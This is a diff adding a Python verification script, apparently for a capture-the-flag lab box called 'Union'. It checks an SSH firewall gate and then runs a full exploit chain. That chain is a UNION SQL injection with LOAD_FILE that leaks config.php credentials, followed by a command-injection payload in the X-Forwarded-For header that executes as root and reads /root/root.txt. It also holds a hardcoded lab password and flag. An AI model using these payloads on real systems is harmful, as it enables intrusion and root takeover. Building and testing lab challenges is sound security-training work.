@@ -1,0 +1,80 @@
+#!/usr/bin/env python3
+"""Functional verification of a valid qualifier, session, SSH firewall and login."""
+import http.cookiejar
+import os
+import socket
+import subprocess
+import urllib.parse
+import urllib.request
+
+host = "union-target"
+base = "http://" + host
+token = os.environ["UNION_TEST_QUALIFIER"]
+assert token.startswith("UHC{") and token.endswith("}")
+
+cookies = http.cookiejar.CookieJar()
+browser = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookies))
+
+def page(path, values=None):
+    data = urllib.parse.urlencode(values).encode() if values is not None else None
+    with browser.open(base + path, data=data, timeout=10) as response:
+        return response.status, response.read().decode("utf-8", "replace")
+
+def can_connect():
+    try:
+        with socket.create_connection((host, 22), timeout=2) as sock:
+            return sock.recv(32).startswith(b"SSH-2.0-")
+    except (OSError, TimeoutError):
+        return False
+
+assert not can_connect(), "SSH must be restricted before admission"
+assert "Qualifier Challenge" in page("/challenge.php")[1]
+assert "Qualifier Challenge" in page("/challenge.php", {"flag": "UHC{invalid}"})[1]
+assert not can_connect(), "Invalid qualifier must not open SSH"
+print("PASS: invalid qualifier cannot open SSH", flush=True)
+
+status, admitted = page("/challenge.php", {"flag": token})
+assert status == 200 and "Your IP Address has now been granted SSH Access." in admitted
+assert can_connect(), "Valid qualifier did not open native SSH gate"
+print("PASS: real PHP session and iptables admission allow SSH", flush=True)
+
+result = subprocess.run(
+    [
+        "sshpass", "-p", "uhc-11qual-global-pw", "ssh",
+        "-o", "StrictHostKeyChecking=no",
+        "-o", "UserKnownHostsFile=/dev/null",
+        "-o", "PreferredAuthentications=password",
+        "-o", "PubkeyAuthentication=no",
+        "-o", "ConnectTimeout=5",
+        "uhc@" + host, "id -un",
+    ],
+    stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=15, check=True,
+)
+assert result.stdout.decode().strip() == "uhc"
+print("PASS: normal OpenSSH password login as uhc over permitted client IP", flush=True)
+
+# Full chain: database credential disclosed by the real SQL injection,
+# authenticated qualifier, then unsafe X-Forwarded-For shell argument under sudo.
+payload = "missing' UNION SELECT LOAD_FILE('/var/www/html/config.php')-- -"
+_, source = page("/index.php", {"player": payload})
+assert 'uhc-11qual-global-pw' in source and '$password' in source, "SQL FILE disclosure failed"
+print("PASS: real SQL injection disclosed application credential", flush=True)
+
+header_command = "127.0.0.1; id > /tmp/union-root-proof; cat /root/root.txt > /tmp/union-root-flag-proof; #"
+req = urllib.request.Request(base + "/firewall.php", headers={"X-Forwarded-For": header_command})
+with browser.open(req, timeout=12) as response:
+    page_body = response.read().decode("utf-8", "replace")
+assert "Welcome Back!" in page_body, "Authenticated firewall route failed"
+result = subprocess.run(
+    [
+        "sshpass", "-p", "uhc-11qual-global-pw", "ssh",
+        "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
+        "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
+        "-o", "ConnectTimeout=5", "uhc@" + host,
+        "cat /tmp/union-root-proof; cat /tmp/union-root-flag-proof",
+    ],
+    capture_output=True, text=True, timeout=16, check=True,
+)
+assert "uid=0(root)" in result.stdout, "Header injection did not run as root"
+assert "TTP{union_ci_private_root_0123456789}" in result.stdout, "Root flag not recovered through injected command"
+print("PASS: real SQL FILE -> leaked credential -> qualifier -> SSH -> header injection -> root flag", flush=True)
